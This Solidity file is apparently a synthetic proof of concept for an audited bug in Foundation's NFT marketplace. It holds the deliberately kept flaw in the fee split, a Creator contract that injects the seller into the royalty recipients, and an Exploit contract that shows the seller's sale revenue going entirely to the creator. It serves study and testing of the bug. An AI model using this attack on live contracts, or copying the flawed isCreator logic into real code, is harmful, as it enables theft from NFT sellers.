// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Foundation — [H-02] Creators can steal sale revenue from owners' sales
    (Code4rena 2022-02-foundation; #42485)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _getCreatorPaymentInfo treats "seller is listed as a royalty
    recipient" as isCreator=true. _getFees then routes ALL revenue (price − fee)
    to creator recipients and leaves ownerRev=0. A creator (or anyone who can
    update the Royalty Registry / getRoyalties) injects the seller into the
    recipients list right before a secondary sale, stealing the seller's share.
    Vulnerable isCreator short-circuit + fee split preserved (@>). */

uint256 constant BASIS_POINTS = 10000;
uint256 constant PRIMARY_FOUNDATION_FEE_BASIS_POINTS = 1500;
uint256 constant SECONDARY_FOUNDATION_FEE_BASIS_POINTS = 500;
uint256 constant CREATOR_ROYALTY_BASIS_POINTS = 1000;

/// @dev Mutable royalty info (simulates Royalty Registry / IGetRoyalties override).
contract MutableRoyaltiesNFT {
    address public creator;
    address payable[] public recipients;
    uint256[] public bps;

    constructor(address _creator) {
        creator = _creator;
        // Default: 100% of royalty share to creator.
        recipients.push(payable(_creator));
        bps.push(10000);
    }

    function setRoyalties(address payable[] memory _recipients, uint256[] memory _bps) external {
        delete recipients;
        delete bps;
        for (uint256 i = 0; i < _recipients.length; i++) {
            recipients.push(_recipients[i]);
            bps.push(_bps[i]);
        }
    }

    function getRoyalties(uint256 /*tokenId*/)
        external
        view
        returns (address payable[] memory _recipients, uint256[] memory recipientBasisPoints)
    {
        _recipients = recipients;
        recipientBasisPoints = bps;
    }
}

/// @dev Reduced NFTMarketCreators + NFTMarketFees fee split.
contract NFTMarketFees {
    mapping(address => mapping(uint256 => bool)) internal _nftContractToTokenIdToFirstSaleCompleted;

    /// @dev Reduced _getCreatorPaymentInfo (4th-priority getRoyalties path only).
    function _getCreatorPaymentInfo(address nftContract, uint256 tokenId, address seller)
        internal
        view
        returns (address payable[] memory recipients, uint256[] memory recipientBasisPoints, bool isCreator)
    {
        (address payable[] memory _recipients, uint256[] memory _bps) =
            MutableRoyaltiesNFT(nftContract).getRoyalties(tokenId);

        if (_recipients.length > 0 && _recipients.length == _bps.length) {
            bool hasRecipient;
            for (uint256 i = 0; i < _recipients.length; ++i) {
                if (_recipients[i] != address(0)) {
                    hasRecipient = true;
                    if (_recipients[i] == seller) {
                        return (_recipients, _bps, true); // @> VULN: seller-as-recipient ⇒ isCreator=true (steals ownerRev)
                    }
                }
            }
            if (hasRecipient) {
                return (_recipients, _bps, false);
            }
        }
        return (recipients, recipientBasisPoints, false);
    }

    function _getFees(address nftContract, uint256 tokenId, address payable seller, uint256 price)
        internal
        view
        returns (
            uint256 foundationFee,
            address payable[] memory creatorRecipients,
            uint256[] memory creatorShares,
            uint256 creatorRev,
            address payable ownerRevTo,
            uint256 ownerRev
        )
    {
        bool isCreator;
        (creatorRecipients, creatorShares, isCreator) = _getCreatorPaymentInfo(nftContract, tokenId, seller);

        // Calculate the Foundation fee
        uint256 fee;
        if (isCreator && !_nftContractToTokenIdToFirstSaleCompleted[nftContract][tokenId]) {
            fee = PRIMARY_FOUNDATION_FEE_BASIS_POINTS;
        } else {
            fee = SECONDARY_FOUNDATION_FEE_BASIS_POINTS;
        }

        foundationFee = (price * fee) / BASIS_POINTS;

        if (creatorRecipients.length > 0) {
            if (isCreator) {
                // When sold by the creator, all revenue is split if applicable.
                creatorRev = price - foundationFee; // @> VULN: secondary seller flagged isCreator → ownerRev=0
            } else {
                // Rounding favors the owner first, then creator, and foundation last.
                creatorRev = (price * CREATOR_ROYALTY_BASIS_POINTS) / BASIS_POINTS;
                ownerRevTo = seller;
                ownerRev = price - foundationFee - creatorRev;
            }
        } else {
            ownerRevTo = seller;
            ownerRev = price - foundationFee;
        }
    }

    /// @dev Public wrapper used by the PoC to compute (and "pay") a sale split.
    function getFees(address nftContract, uint256 tokenId, address payable seller, uint256 price)
        external
        view
        returns (uint256 foundationFee, uint256 creatorRev, address ownerRevTo, uint256 ownerRev, bool isCreatorFlag)
    {
        address payable[] memory creatorRecipients;
        uint256[] memory creatorShares;
        (foundationFee, creatorRecipients, creatorShares, creatorRev, ownerRevTo, ownerRev) =
            _getFees(nftContract, tokenId, seller, price);
        // Re-derive isCreator for assertions (seller-in-recipients).
        (,, isCreatorFlag) = _getCreatorPaymentInfo(nftContract, tokenId, seller);
        creatorRecipients;
        creatorShares;
    }

    function markFirstSale(address nftContract, uint256 tokenId) external {
        _nftContractToTokenIdToFirstSaleCompleted[nftContract][tokenId] = true;
    }
}

/// @dev Minimal market that settles ETH sale using the vulnerable fee split.
contract FoundationMarket {
    NFTMarketFees public fees;
    address public foundationTreasury;

    constructor(address _fees, address _treasury) {
        fees = NFTMarketFees(_fees);
        foundationTreasury = _treasury;
    }

    function buy(address nftContract, uint256 tokenId, address payable seller) external payable {
        uint256 price = msg.value;
        (uint256 foundationFee, uint256 creatorRev, address ownerRevTo, uint256 ownerRev, bool isCreatorFlag) =
            fees.getFees(nftContract, tokenId, seller, price);
        isCreatorFlag;

        // Pay foundation.
        (bool okF,) = foundationTreasury.call{value: foundationFee}("");
        require(okF, "fee");

        // Pay creator royalty recipients (simplified: single first recipient gets creatorRev).
        (address payable[] memory recips,) = MutableRoyaltiesNFT(nftContract).getRoyalties(tokenId);
        require(recips.length > 0, "no recip");
        (bool okC,) = recips[0].call{value: creatorRev}("");
        require(okC, "creator");

        // Pay owner (may be 0 under the bug).
        if (ownerRev > 0 && ownerRevTo != address(0)) {
            (bool okO,) = ownerRevTo.call{value: ownerRev}("");
            require(okO, "owner");
        }

        fees.markFirstSale(nftContract, tokenId);
    }
}

contract Creator {
    receive() external payable {}

    function rugRoyalties(MutableRoyaltiesNFT nft, address payable seller) external {
        // Inject the secondary seller into royalty recipients → isCreator short-circuit.
        address payable[] memory recips = new address payable[](2);
        uint256[] memory bps = new uint256[](2);
        recips[0] = payable(address(this));
        recips[1] = seller;
        bps[0] = 5000;
        bps[1] = 5000;
        nft.setRoyalties(recips, bps);
    }
}

contract Seller {
    receive() external payable {}
}

contract Buyer {
    receive() external payable {}

    function buy(FoundationMarket m, address nft, uint256 tokenId, address payable seller) external payable {
        m.buy{value: msg.value}(nft, tokenId, seller);
    }
}

contract Exploit {
    NFTMarketFees public feeLib; // CREATE 1 — vulnerable split
    FoundationMarket public market; // CREATE 2
    MutableRoyaltiesNFT public nft; // CREATE 3
    Creator public creator; // CREATE 4
    Seller public seller; // CREATE 5
    Buyer public buyer; // CREATE 6
    address public treasury; // CREATE-less burn address stand-in

    uint256 public constant PRICE = 10 ether;
    uint256 public constant TOKEN_ID = 1;

    constructor() {
        treasury = address(0xFEE);
        feeLib = new NFTMarketFees();
        market = new FoundationMarket(address(feeLib), treasury);
        creator = new Creator();
        seller = new Seller();
        buyer = new Buyer();
        nft = new MutableRoyaltiesNFT(address(creator));
        // Secondary sale: first sale already completed.
        feeLib.markFirstSale(address(nft), TOKEN_ID);
    }

    function run() external payable {
        require(msg.value >= PRICE, "need sale eth");
        // Honest secondary baseline: seller not in recipients → owner gets most of price.
        (uint256 f0, uint256 c0, address oTo0, uint256 o0, bool ic0) =
            feeLib.getFees(address(nft), TOKEN_ID, payable(address(seller)), PRICE);
        require(!ic0, "baseline not creator");
        require(oTo0 == address(seller), "owner is seller");
        require(o0 > 0, "owner rev positive");
        // secondary fee 5%, royalty 10% → owner = 85%
        require(f0 == (PRICE * 500) / 10000, "fee");
        require(c0 == (PRICE * 1000) / 10000, "royalty");
        require(o0 == PRICE - f0 - c0, "owner share");

        // Creator rugs: add seller to royalty recipients via registry-like override.
        creator.rugRoyalties(nft, payable(address(seller)));

        (uint256 f1, uint256 c1, address oTo1, uint256 o1, bool ic1) =
            feeLib.getFees(address(nft), TOKEN_ID, payable(address(seller)), PRICE);
        // @> VULN path: isCreator=true because seller ∈ recipients → ownerRev=0
        require(ic1, "flagged as creator sale");
        require(o1 == 0, "owner rev stolen");
        require(oTo1 == address(0), "no owner recipient");
        require(c1 == PRICE - f1, "creator takes all post-fee");

        // Settle for real: buyer pays PRICE, creator receives almost all, seller gets 0.
        uint256 creatorBefore = address(creator).balance;
        uint256 sellerBefore = address(seller).balance;
        buyer.buy{value: PRICE}(market, address(nft), TOKEN_ID, payable(address(seller)));

        require(address(seller).balance == sellerBefore, "seller got 0");
        require(address(creator).balance == creatorBefore + c1, "creator stole sale revenue");
        // Harm: secondary seller receives nothing; creator takes price − foundation fee.
    }

    receive() external payable {}
}
